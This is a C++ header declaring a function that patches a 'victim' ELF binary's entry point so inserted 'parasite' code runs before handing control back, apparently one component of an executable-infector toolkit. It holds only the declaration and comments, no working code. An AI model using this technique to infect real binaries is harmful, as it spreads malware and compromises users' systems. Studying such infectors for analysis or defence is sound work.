#pragma once

#include <elf.h>
#include <span>

namespace vt::redirection {

// Redirect victim's elf entry point to run the parasite code. Once it finishes,
// hand control back to original entry point. Users must provide the correct
// patch_offset_from_parasite_start.
// @param parasite_entry_address parasite's vaddr start
// @param parasite_file_offset parasite's file insertion offset
// @param victim The victim to be patched
// @param parasite_patch_offset The offset start from the parasite to be
// patched.
bool patch_entry_point(Elf64_Addr parasite_entry_address,
                       Elf64_Off parasite_file_offset,
                       Elf64_Off patch_offset_from_parasite_start,
                       std::span<std::byte> victim);

}  // namespace vt::redirection